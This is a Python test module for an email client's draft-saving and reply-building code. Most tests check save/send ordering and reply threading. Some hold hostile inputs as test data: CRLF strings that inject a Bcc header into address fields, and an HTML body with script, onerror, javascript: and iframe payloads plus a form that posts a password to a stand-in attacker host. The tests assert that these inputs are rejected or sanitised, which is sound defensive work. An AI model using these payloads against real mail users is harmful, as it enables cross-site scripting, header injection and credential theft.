"""`mailosh.services.compose`: the draft lifecycle, and `build_reply`.

Two halves, tested very differently on purpose.

The **draft lifecycle** (`save_draft`/`send_draft`/`discard_draft`) is
tested against a `FakeClient` that records the order it was called in and
can be told to fail at a chosen point. Order is the whole point: JMAP
bodies are immutable, so every autosave creates a new Email and destroys
the previous one, and a destroy that happens *before* the create succeeds
loses the user's draft. Half the tests here exercise the failure path, not
the happy one, because the happy path never notices which order those two
calls went in.

`build_reply` is pure and synchronous, so it is tested directly and
exhaustively — no client, no fake, no awaits. The rules it encodes are each
a documented way to get replies wrong: threading headers that break every
other client's threading, a reply-all that mails the user their own reply,
and a quote that carries a stranger's HTML into an outgoing message. The
last one is the reason `test_a_hostile_body_is_sanitised_before_it_is_quoted`
exists and why it asserts on what is *absent*.
"""

from __future__ import annotations

import logging
from datetime import UTC, datetime

import pytest

from mailosh.jmap.errors import JmapError
from mailosh.jmap.models import Address, BodyPart, EmailBody, Identity
from mailosh.render.html_sanitize import MAX_NESTING_DEPTH
from mailosh.render.quote_trim import split_html
from mailosh.services.compose import (
    FORWARD,
    QUOTE_CLASS,
    REPLY,
    REPLY_ALL,
    AttachmentRef,
    ComposeError,
    DraftInput,
    InvalidAddress,
    NoRecipients,
    Recipient,
    UnknownIdentity,
    build_reply,
    discard_draft,
    list_identities,
    save_draft,
    send_draft,
)

DEFAULT_IDENTITY = Identity(id="id-1", email="demo@mailosh.test", name="Demo User")
ALIAS_IDENTITY = Identity(id="id-2", email="alias@mailosh.test", name="Demo Alias")

ME = "demo@mailosh.test"


class FakeClient:
    """A `JmapClient` stand-in that records what it was asked to do, in order.

    `calls` is the ordered log every ordering assertion in this module reads
    — a list of `(method, payload)` pairs rather than three separate
    counters, because "did the destroy happen before the create" is a
    question only a single ordered log can answer.

    `fail_on` names a method that raises `JmapError` instead of running,
    which is how the interrupted-autosave tests get an interruption without
    a network.
    """

    def __init__(
        self,
        *,
        identities: list[Identity] | None = None,
        fail_on: str | None = None,
    ) -> None:
        self.identities = identities if identities is not None else [DEFAULT_IDENTITY]
        self.fail_on = fail_on
        self.calls: list[tuple[str, object]] = []
        self.next_draft_id = "e-new"

    def _record(self, method: str, payload: object) -> None:
        self.calls.append((method, payload))
        if self.fail_on == method:
            raise JmapError(f"{method} failed")

    @property
    def methods(self) -> list[str]:
        return [method for method, _ in self.calls]

    async def get_identity(self) -> Identity:
        self._record("get_identity", None)
        return self.identities[0]

    async def get_identities(self) -> list[Identity]:
        self._record("get_identities", None)
        return list(self.identities)

    async def create_draft(self, **kwargs: object) -> str:
        self._record("create_draft", kwargs)
        return self.next_draft_id

    async def destroy_emails(self, email_ids: list[str]) -> None:
        self._record("destroy_emails", list(email_ids))

    async def send_message(self, **kwargs: object) -> tuple[str, str]:
        self._record("send_message", kwargs)
        return "sub-1", "e-sent"


def payload_of(client: FakeClient, method: str) -> dict:
    return next(dict(payload) for name, payload in client.calls if name == method)  # type: ignore[arg-type]


# ---------------------------------------------------------------------------
# save_draft: create first, destroy second.
# ---------------------------------------------------------------------------


async def test_save_draft_creates_the_new_revision_before_destroying_the_old():
    client = FakeClient()
    draft = DraftInput(to=(Recipient(email="alice@example.com"),), text="hi", draft_id="e-old")

    new_id = await save_draft(client, draft)

    assert new_id == "e-new"
    # The ordering *is* the property. A log that merely contained both
    # calls would pass with them the wrong way round.
    assert client.methods.index("create_draft") < client.methods.index("destroy_emails")
    assert ("destroy_emails", ["e-old"]) in client.calls


async def test_an_interrupted_save_leaves_the_previous_draft_alone():
    # The failure this ordering exists for: if the destroy ran first and
    # the create then failed — a dropped connection, a quota, a restart —
    # the user's draft would be gone, destroyed to make room for something
    # that never arrived.
    client = FakeClient(fail_on="create_draft")
    draft = DraftInput(to=(Recipient(email="alice@example.com"),), text="hi", draft_id="e-old")

    with pytest.raises(JmapError):
        await save_draft(client, draft)

    assert "destroy_emails" not in client.methods


async def test_the_first_save_of_a_new_draft_destroys_nothing():
    client = FakeClient()

    await save_draft(client, DraftInput(text="hi"))

    assert "destroy_emails" not in client.methods


async def test_a_failed_cleanup_still_returns_the_new_draft_id(caplog):
    # Deliberately asymmetric with every other JMAP failure in the module:
    # the new draft already exists, and the caller's only way to learn its
    # id is this function returning. Raising would leave the dock holding
    # the old id, so its next autosave would orphan the draft we just made.
    client = FakeClient(fail_on="destroy_emails")
    draft = DraftInput(text="hi", draft_id="e-old")

    with caplog.at_level(logging.WARNING, logger="mailosh.services.compose"):
        new_id = await save_draft(client, draft)

    assert new_id == "e-new"
    assert len(caplog.records) == 1
    assert "e-old" in caplog.records[0].getMessage()


async def test_save_draft_does_not_destroy_the_draft_it_just_created():
    client = FakeClient()
    client.next_draft_id = "e-old"

    await save_draft(client, DraftInput(text="hi", draft_id="e-old"))

    assert "destroy_emails" not in client.methods


async def test_save_draft_accepts_a_draft_with_no_recipients():
    # A dock two seconds into a new message. Refusing to save this would be
    # refusing to save exactly the drafts autosave exists for.
    client = FakeClient()

    await save_draft(client, DraftInput(subject="thoughts", text="half a sentence"))

    assert payload_of(client, "create_draft")["to"] == []


async def test_save_draft_maps_every_field_onto_the_client():
    client = FakeClient()
    draft = DraftInput(
        to=(Recipient(email="alice@example.com", name="Alice"),),
        cc=(Recipient(email="cc@example.com"),),
        bcc=(Recipient(email="bcc@example.com"),),
        subject="Hello",
        html="<p>Hi</p>",
        text="Hi",
        attachments=(AttachmentRef(blob_id="B1", name="a.pdf", type="application/pdf", size=9),),
        in_reply_to="orig@example.com",
        references=("root@example.com",),
    )

    await save_draft(client, draft)

    sent = payload_of(client, "create_draft")
    assert sent["sender"] == Address(email="demo@mailosh.test", name="Demo User")
    assert sent["to"] == [Address(email="alice@example.com", name="Alice")]
    assert sent["cc"] == [Address(email="cc@example.com")]
    assert sent["bcc"] == [Address(email="bcc@example.com")]
    assert sent["in_reply_to"] == ("orig@example.com",)
    assert sent["references"] == ("root@example.com",)
    assert sent["attachments"] == [
        BodyPart(blob_id="B1", name="a.pdf", type="application/pdf", size=9)
    ]


# ---------------------------------------------------------------------------
# send_draft
# ---------------------------------------------------------------------------


async def test_send_draft_returns_both_ids_and_clears_the_autosave():
    client = FakeClient()
    draft = DraftInput(to=(Recipient(email="alice@example.com"),), text="hi", draft_id="e-old")

    result = await send_draft(client, draft)

    assert (result.submission_id, result.email_id) == ("sub-1", "e-sent")
    assert client.methods.index("send_message") < client.methods.index("destroy_emails")
    assert ("destroy_emails", ["e-old"]) in client.calls


async def test_a_failed_send_leaves_the_draft_where_it_was():
    # Design spec §8: "failures reopen the dock with the error" — which
    # only works if the draft the dock reopens still exists.
    client = FakeClient(fail_on="send_message")
    draft = DraftInput(to=(Recipient(email="alice@example.com"),), text="hi", draft_id="e-old")

    with pytest.raises(JmapError):
        await send_draft(client, draft)

    assert "destroy_emails" not in client.methods


async def test_sending_with_no_recipient_never_reaches_the_server():
    # Stalwart accepts the Email/set create and only rejects the
    # EmailSubmission/set with `noRecipients` (verified live), which would
    # leave an orphan draft behind for every attempt.
    client = FakeClient()

    with pytest.raises(NoRecipients):
        await send_draft(client, DraftInput(subject="oops", text="hi"))

    assert client.calls == []


@pytest.mark.parametrize("field", ["cc", "bcc"])
async def test_a_recipient_in_cc_or_bcc_alone_is_enough(field):
    client = FakeClient()
    draft = DraftInput(**{field: (Recipient(email="alice@example.com"),)}, text="hi")

    await send_draft(client, draft)

    assert "send_message" in client.methods


async def test_send_draft_passes_the_resolved_identity_through():
    client = FakeClient(identities=[DEFAULT_IDENTITY, ALIAS_IDENTITY])
    draft = DraftInput(to=(Recipient(email="alice@example.com"),), text="hi", identity_id="id-2")

    await send_draft(client, draft)

    assert payload_of(client, "send_message")["identity"] == ALIAS_IDENTITY


# ---------------------------------------------------------------------------
# Identity resolution
# ---------------------------------------------------------------------------


async def test_an_unset_identity_uses_the_account_default():
    client = FakeClient(identities=[DEFAULT_IDENTITY, ALIAS_IDENTITY])

    await save_draft(client, DraftInput(text="hi"))

    assert "get_identities" not in client.methods
    assert payload_of(client, "create_draft")["sender"].email == "demo@mailosh.test"


async def test_an_unknown_identity_is_refused_before_anything_is_created():
    client = FakeClient(identities=[DEFAULT_IDENTITY])

    with pytest.raises(UnknownIdentity) as exc_info:
        await save_draft(client, DraftInput(text="hi", identity_id="id-nope"))

    assert exc_info.value.identity_id == "id-nope"
    assert "create_draft" not in client.methods


async def test_list_identities_returns_the_accounts_own_list():
    client = FakeClient(identities=[DEFAULT_IDENTITY, ALIAS_IDENTITY])
    assert await list_identities(client) == [DEFAULT_IDENTITY, ALIAS_IDENTITY]


async def test_discard_draft_destroys_it():
    client = FakeClient()
    await discard_draft(client, "e-old")
    assert client.calls == [("destroy_emails", ["e-old"])]


# ---------------------------------------------------------------------------
# Address validation
# ---------------------------------------------------------------------------


@pytest.mark.parametrize(
    "address",
    [
        "",
        "   ",
        "no-at-sign",
        "two@at@signs.com",
        "trailing@dot.",
        "@nolocal.com",
        "nodomain@",
        "double@dot..com",
        "spaces in@example.com",
        "alice@example.com, bob@example.com",
        "alice@example.com\r\nBcc: victim@example.com",
        "alice@example.com\nX-Header: x",
        "a" * 250 + "@example.com",
    ],
)
async def test_a_malformed_address_is_surfaced_not_dropped(address):
    # Dropping it silently would produce a message that looks sent and
    # never arrives — and, for the CRLF cases, one whose header the server
    # assembles from a string we should never have handed it.
    client = FakeClient()

    with pytest.raises(InvalidAddress) as exc_info:
        await save_draft(client, DraftInput(to=(Recipient(email=address),)))

    assert exc_info.value.field == "to"
    assert client.calls == []


@pytest.mark.parametrize(
    "address", ["alice@example.com", "first.last@sub.example.co.uk", "root@localhost"]
)
async def test_ordinary_addresses_are_accepted(address):
    client = FakeClient()
    await save_draft(client, DraftInput(to=(Recipient(email=address),)))
    assert payload_of(client, "create_draft")["to"] == [Address(email=address)]


async def test_surrounding_whitespace_is_trimmed_not_rejected():
    client = FakeClient()
    await save_draft(client, DraftInput(to=(Recipient(email="  alice@example.com \n"),)))
    assert payload_of(client, "create_draft")["to"] == [Address(email="alice@example.com")]


async def test_a_display_name_carrying_a_newline_is_refused():
    client = FakeClient()
    recipient = Recipient(email="alice@example.com", name="Alice\r\nBcc: victim@example.com")

    with pytest.raises(InvalidAddress):
        await save_draft(client, DraftInput(to=(recipient,)))


@pytest.mark.parametrize("field", ["to", "cc", "bcc"])
async def test_every_recipient_field_is_validated(field):
    client = FakeClient()
    draft = DraftInput(**{field: (Recipient(email="bad address"),)})

    with pytest.raises(InvalidAddress) as exc_info:
        await save_draft(client, draft)

    assert exc_info.value.field == field


async def test_an_attachment_with_no_blob_is_refused():
    client = FakeClient()
    draft = DraftInput(
        to=(Recipient(email="a@example.com"),),
        attachments=(AttachmentRef(blob_id="", name="a.pdf", type="application/pdf", size=1),),
    )

    with pytest.raises(ComposeError):
        await send_draft(client, draft)

    assert client.calls == []


# ---------------------------------------------------------------------------
# build_reply: fixtures
# ---------------------------------------------------------------------------


def message(
    *,
    id: str = "e1",
    from_: list[Address] | None = None,
    to: list[Address] | None = None,
    cc: list[Address] | None = None,
    bcc: list[Address] | None = None,
    reply_to: list[Address] | None = None,
    subject: str = "Offsite agenda",
    received_at: datetime | None = None,
    text_body: str | None = "Thursday works for me.",
    html_body: str | None = None,
    message_id: list[str] | None = None,
    references: list[str] | None = None,
    attachments: list[BodyPart] | None = None,
) -> EmailBody:
    return EmailBody(
        id=id,
        thread_id="t1",
        mailbox_ids={"mb-inbox"},
        keywords={"$seen"},
        from_=from_ if from_ is not None else [Address(name="Dan Okafor", email="dan@example.com")],
        to=to if to is not None else [Address(email=ME)],
        cc=cc or [],
        bcc=bcc or [],
        reply_to=reply_to or [],
        subject=subject,
        received_at=received_at or datetime(2026, 9, 1, 20, 41, tzinfo=UTC),
        preview="preview",
        has_attachment=bool(attachments),
        text_body=text_body,
        html_body=html_body,
        message_id=message_id if message_id is not None else ["orig@example.com"],
        references=references or [],
        attachments=attachments or [],
    )


# ---------------------------------------------------------------------------
# build_reply: recipients
# ---------------------------------------------------------------------------


def test_reply_goes_to_the_sender_only():
    reply = build_reply([message()], "e1", REPLY, ME)

    assert reply.to == (Recipient(email="dan@example.com", name="Dan Okafor"),)
    assert reply.cc == ()


def test_reply_prefers_reply_to_over_from():
    original = message(reply_to=[Address(email="list@example.com")])

    reply = build_reply([original], "e1", REPLY, ME)

    assert reply.to == (Recipient(email="list@example.com"),)


def test_replying_to_your_own_message_addresses_who_you_wrote_to():
    # Otherwise "reply" on something in Sent produces a draft addressed to
    # the user themself, which is never what they meant.
    original = message(
        from_=[Address(email=ME)],
        to=[Address(email="dan@example.com"), Address(email="tom@example.com")],
    )

    reply = build_reply([original], "e1", REPLY, ME)

    assert [r.email for r in reply.to] == ["dan@example.com", "tom@example.com"]


def test_reply_all_is_every_recipient_plus_the_sender_minus_me():
    original = message(
        to=[Address(email=ME), Address(email="tom@example.com")],
        cc=[Address(email="aisha@example.com"), Address(email=ME)],
    )

    reply = build_reply([original], "e1", REPLY_ALL, ME)

    assert [r.email for r in reply.to] == ["dan@example.com", "tom@example.com"]
    assert [r.email for r in reply.cc] == ["aisha@example.com"]


def test_reply_all_matches_my_own_address_case_insensitively():
    # The classic bug this parameter exists to prevent, in the spelling
    # that actually shows up: mail servers preserve the case a sender
    # typed, so the user's address comes back capitalised differently than
    # they log in with.
    original = message(to=[Address(email="Demo@Mailosh.TEST"), Address(email="tom@example.com")])

    reply = build_reply([original], "e1", REPLY_ALL, ME)

    assert [r.email for r in reply.to] == ["dan@example.com", "tom@example.com"]


def test_reply_all_deduplicates_an_address_that_appears_twice():
    original = message(
        from_=[Address(name="Dan", email="dan@example.com")],
        to=[Address(email="DAN@example.com"), Address(email="tom@example.com")],
        cc=[Address(email="tom@example.com")],
    )

    reply = build_reply([original], "e1", REPLY_ALL, ME)

    assert [r.email for r in reply.to] == ["dan@example.com", "tom@example.com"]
    assert reply.cc == ()


def test_reply_all_never_carries_bcc_over():
    # Those recipients were blind on the original; copying them into a
    # visible reply would out them.
    original = message(bcc=[Address(email="secret@example.com")])

    reply = build_reply([original], "e1", REPLY_ALL, ME)

    assert reply.bcc == ()
    assert "secret@example.com" not in str(reply.to) + str(reply.cc)


def test_reply_all_to_a_note_you_sent_only_to_yourself_still_has_a_recipient():
    original = message(from_=[Address(email=ME)], to=[Address(email=ME)])

    reply = build_reply([original], "e1", REPLY_ALL, ME)

    assert [r.email for r in reply.to] == [ME]


def test_forward_leaves_the_recipients_for_the_user():
    reply = build_reply([message()], "e1", FORWARD, ME)

    assert reply.to == ()
    assert reply.cc == ()


# ---------------------------------------------------------------------------
# build_reply: subject
# ---------------------------------------------------------------------------


@pytest.mark.parametrize(
    ("subject", "mode", "expected"),
    [
        ("Offsite agenda", REPLY, "Re: Offsite agenda"),
        ("Re: Offsite agenda", REPLY, "Re: Offsite agenda"),
        ("RE: Offsite agenda", REPLY, "RE: Offsite agenda"),
        ("re:Offsite agenda", REPLY, "re:Offsite agenda"),
        # A forward is part of what the subject says; a reply to one keeps
        # it rather than collapsing every prefix into a single "Re:".
        ("Fwd: Offsite agenda", REPLY, "Re: Fwd: Offsite agenda"),
        ("Offsite agenda", FORWARD, "Fwd: Offsite agenda"),
        ("Fwd: Offsite agenda", FORWARD, "Fwd: Offsite agenda"),
        ("Fw: Offsite agenda", FORWARD, "Fw: Offsite agenda"),
        ("", REPLY, "Re:"),
        ("", FORWARD, "Fwd:"),
    ],
)
def test_subject_prefixes(subject, mode, expected):
    assert build_reply([message(subject=subject)], "e1", mode, ME).subject == expected


# ---------------------------------------------------------------------------
# build_reply: threading headers
# ---------------------------------------------------------------------------


def test_a_reply_points_at_the_message_it_answers():
    reply = build_reply([message()], "e1", REPLY, ME)

    assert reply.in_reply_to == "orig@example.com"
    assert reply.references == ("orig@example.com",)


def test_references_is_the_originals_own_chain_plus_its_message_id():
    original = message(
        references=["root@example.com", "second@example.com"],
        message_id=["orig@example.com"],
    )

    reply = build_reply([original], "e1", REPLY, ME)

    assert reply.references == ("root@example.com", "second@example.com", "orig@example.com")


def test_angle_brackets_are_stripped_from_message_ids():
    # RFC 8621 §4.1.3's asMessageIds form is bracket-less and the server
    # re-adds the brackets. A value that round-tripped through a form post
    # can arrive either way.
    original = message(references=["<root@example.com>"], message_id=["<orig@example.com>"])

    reply = build_reply([original], "e1", REPLY, ME)

    assert reply.in_reply_to == "orig@example.com"
    assert reply.references == ("root@example.com", "orig@example.com")


def test_references_is_rebuilt_from_the_thread_when_the_original_dropped_it():
    # Some clients drop References entirely. Without this the reply
    # re-roots the conversation, and the symptom — a thread that splits in
    # two — is only visible in *other* people's mailboxes.
    root = message(
        id="e0",
        message_id=["root@example.com"],
        received_at=datetime(2026, 9, 1, 9, 0, tzinfo=UTC),
    )
    original = message(id="e1", message_id=["orig@example.com"], references=[])
    later = message(
        id="e2",
        message_id=["later@example.com"],
        received_at=datetime(2026, 9, 2, 9, 0, tzinfo=UTC),
    )

    reply = build_reply([later, original, root], "e1", REPLY, ME)

    # The root, then the message being replied to. Never the message that
    # came *after* it — that is not an ancestor.
    assert reply.references == ("root@example.com", "orig@example.com")


def test_references_is_capped_keeping_the_root_and_the_recent_chain():
    chain = [f"m{n}@example.com" for n in range(60)]
    original = message(references=chain, message_id=["orig@example.com"])

    reply = build_reply([original], "e1", REPLY, ME)

    assert len(reply.references) == 21
    assert reply.references[0] == "m0@example.com"
    assert reply.references[-1] == "orig@example.com"
    assert reply.references[-2] == "m59@example.com"


def test_references_deduplicates_a_repeated_message_id():
    original = message(references=["root@example.com", "root@example.com"])

    reply = build_reply([original], "e1", REPLY, ME)

    assert reply.references == ("root@example.com", "orig@example.com")


def test_a_reply_to_a_message_with_no_message_id_has_no_in_reply_to():
    reply = build_reply([message(message_id=[])], "e1", REPLY, ME)

    assert reply.in_reply_to is None
    assert reply.references == ()


def test_a_forward_starts_its_own_conversation():
    # A forward is aimed at somebody who was not in the old thread;
    # threading it into the original files it under a conversation they
    # cannot see.
    original = message(references=["root@example.com"])

    reply = build_reply([original], "e1", FORWARD, ME)

    assert reply.in_reply_to is None
    assert reply.references == ()


# ---------------------------------------------------------------------------
# build_reply: attachments
# ---------------------------------------------------------------------------


def test_a_forward_carries_the_attachments():
    original = message(
        attachments=[
            BodyPart(blob_id="B1", name="report.pdf", type="application/pdf", size=1234),
            BodyPart(blob_id="B2", name="logo.png", type="image/png", size=89, cid="logo@x.test"),
        ]
    )

    reply = build_reply([original], "e1", FORWARD, ME)

    assert reply.attachments == (
        AttachmentRef(blob_id="B1", name="report.pdf", type="application/pdf", size=1234),
        AttachmentRef(blob_id="B2", name="logo.png", type="image/png", size=89, cid="logo@x.test"),
    )


@pytest.mark.parametrize("mode", [REPLY, REPLY_ALL])
def test_a_reply_does_not(mode):
    original = message(
        attachments=[BodyPart(blob_id="B1", name="report.pdf", type="application/pdf", size=1)]
    )

    assert build_reply([original], "e1", mode, ME).attachments == ()


def test_an_attachment_with_no_blob_is_skipped():
    original = message(attachments=[BodyPart(blob_id=None, name="x", type="text/plain", size=0)])

    assert build_reply([original], "e1", FORWARD, ME).attachments == ()


# ---------------------------------------------------------------------------
# build_reply: the quote
# ---------------------------------------------------------------------------


def test_a_hostile_body_is_sanitised_before_it_is_quoted():
    # The whole point of the module docstring's warning. This HTML came
    # from a stranger and is about to be mailed onward to somebody else,
    # whose client will render it.
    original = message(
        html_body=(
            "<p>QUOTED-VISIBLE: the readable part.</p>"
            "<script>alert(1)</script>"
            '<img src="x" onerror="alert(2)">'
            '<a href="javascript:alert(3)">link</a>'
            '<div style="position:fixed;width:expression(alert(4))">positioned</div>'
            '<iframe srcdoc="&lt;script&gt;alert(5)&lt;/script&gt;"></iframe>'
            '<form action="https://attacker.invalid/steal"><input name="password"></form>'
        )
    )

    reply = build_reply([original], "e1", REPLY, ME)

    assert "QUOTED-VISIBLE" in reply.html
    for payload in (
        "<script",
        "onerror",
        "javascript:",
        "srcdoc",
        "<iframe",
        "<form",
        "expression(",
    ):
        assert payload not in reply.html, payload
    assert "position:fixed" not in reply.html


def test_a_plain_text_original_is_escaped_into_the_quote():
    original = message(text_body="1 < 2 & <script>alert(1)</script>", html_body=None)

    reply = build_reply([original], "e1", REPLY, ME)

    assert "<script>" not in reply.html
    assert "&lt;script&gt;" in reply.html
    assert "1 &lt; 2 &amp;" in reply.html


def test_a_body_too_deep_to_sanitise_is_quoted_as_text(caplog):
    # Only a deliberately hostile message reaches this. Quoting nothing
    # would mean a reply that silently drops the message it replies to.
    deep = "<div>" * (MAX_NESTING_DEPTH + 5) + "boom" + "</div>" * (MAX_NESTING_DEPTH + 5)
    original = message(html_body=deep, text_body="DEEP-FALLBACK-TEXT")

    with caplog.at_level(logging.WARNING, logger="mailosh.services.compose"):
        reply = build_reply([original], "e1", REPLY, ME)

    assert "DEEP-FALLBACK-TEXT" in reply.html
    assert "boom" not in reply.html
    assert len(caplog.records) == 1


def test_the_quote_uses_the_class_pair_the_spec_names():
    reply = build_reply([message()], "e1", REPLY, ME)
    assert f'class="{QUOTE_CLASS}"' in reply.html


def test_our_own_reply_splits_back_apart_at_the_quote():
    # The round trip that matters: a reply this app composes must collapse
    # correctly when this app reads it back, which is what makes
    # `mailosh_quote` being in `quote_trim.QUOTE_MATCHERS` worth anything.
    reply = build_reply([message()], "e1", REPLY, ME)
    body = f"<div>My answer is yes.</div>{reply.html}"

    visible, quoted = split_html(body)

    assert "My answer is yes." in visible
    assert "Thursday works for me." not in visible
    assert "Thursday works for me." in quoted
    # The attribution line belongs to the history, not to the reply above.
    assert "wrote:" not in visible


def test_the_attribution_line_names_the_author_and_when_they_wrote():
    original = message(
        from_=[Address(name="Daniel Okafor", email="dan@example.com")],
        received_at=datetime(2026, 9, 1, 20, 41, tzinfo=UTC),
    )

    reply = build_reply([original], "e1", REPLY, ME)

    assert "On Sep 1, 2026 at 8:41 PM, Daniel Okafor wrote:" in reply.html
    assert reply.text.startswith("\n\nOn Sep 1, 2026 at 8:41 PM, Daniel Okafor wrote:\n")


def test_the_attribution_prefers_sent_at_over_received_at():
    original = message(received_at=datetime(2026, 9, 2, 9, 0, tzinfo=UTC))
    original = original.model_copy(update={"sent_at": datetime(2026, 9, 1, 20, 41, tzinfo=UTC)})

    assert "Sep 1, 2026 at 8:41 PM" in build_reply([original], "e1", REPLY, ME).html


def test_a_display_name_in_the_attribution_is_escaped():
    original = message(from_=[Address(name="<script>alert(1)</script>", email="x@example.com")])

    reply = build_reply([original], "e1", REPLY, ME)

    assert "<script>" not in reply.html
    assert "&lt;script&gt;" in reply.html


def test_a_message_with_no_sender_still_gets_an_attribution():
    reply = build_reply([message(from_=[])], "e1", REPLY, ME)
    assert "(unknown sender) wrote:" in reply.html


def test_the_plain_text_quote_is_prefixed_line_by_line():
    original = message(text_body="Thursday works.\n\nSee you then.")

    reply = build_reply([original], "e1", REPLY, ME)

    assert reply.text.endswith("> Thursday works.\n>\n> See you then.")


def test_an_html_only_original_contributes_no_text_quote():
    # Its content still reaches the recipient through the HTML part;
    # deriving text from HTML would mean a second HTML-to-text renderer.
    original = message(text_body=None, html_body="<p>Thursday works.</p>")

    reply = build_reply([original], "e1", REPLY, ME)

    assert reply.text == "\n\nOn Sep 1, 2026 at 8:41 PM, Dan Okafor wrote:\n"
    assert "Thursday works." in reply.html


def test_a_forward_carries_a_header_block_in_both_halves():
    original = message(
        from_=[Address(name="Dan Okafor", email="dan@example.com")],
        to=[Address(email=ME)],
        cc=[Address(email="aisha@example.com")],
        subject="Offsite agenda",
    )

    reply = build_reply([original], "e1", FORWARD, ME)

    for half in (reply.html, reply.text):
        assert "Forwarded message" in half
        assert "Subject: Offsite agenda" in half
        assert "Cc: aisha@example.com" in half
    # The same header block, escaped in the half that is markup and not in
    # the half that is not.
    assert "From: Dan Okafor &lt;dan@example.com&gt;" in reply.html
    assert "From: Dan Okafor <dan@example.com>" in reply.text
    # A forward is the content, not a citation inside somebody's reply, so
    # it is not indented behind a quote bar.
    assert "<blockquote" not in reply.html
    # The plain-text half is not `>`-prefixed either.
    assert "\n> " not in reply.text


def test_a_forward_with_no_cc_says_nothing_about_cc():
    reply = build_reply([message(cc=[])], "e1", FORWARD, ME)
    assert "Cc:" not in reply.text


def test_the_composer_gets_an_empty_line_above_the_quote():
    reply = build_reply([message()], "e1", REPLY, ME)
    assert reply.html.startswith("<div><br></div><div class=")


# ---------------------------------------------------------------------------
# build_reply: bad input
# ---------------------------------------------------------------------------


def test_an_unknown_mode_is_refused():
    with pytest.raises(ComposeError):
        build_reply([message()], "e1", "reply-all", ME)


def test_a_message_outside_the_thread_is_refused():
    with pytest.raises(ComposeError):
        build_reply([message()], "e-nope", REPLY, ME)


def test_a_naive_timestamp_is_read_as_utc_rather_than_crashing():
    # Nothing in the app produces one — JMAP always sends `Z` — but a
    # hand-built EmailBody can, and comparing naive against aware raises.
    root = message(id="e0", message_id=["root@example.com"], received_at=datetime(2026, 9, 1, 9, 0))
    original = message(id="e1", references=[], received_at=datetime(2026, 9, 1, 20, 41))

    reply = build_reply([original, root], "e1", REPLY, ME)

    assert reply.references == ("root@example.com", "orig@example.com")
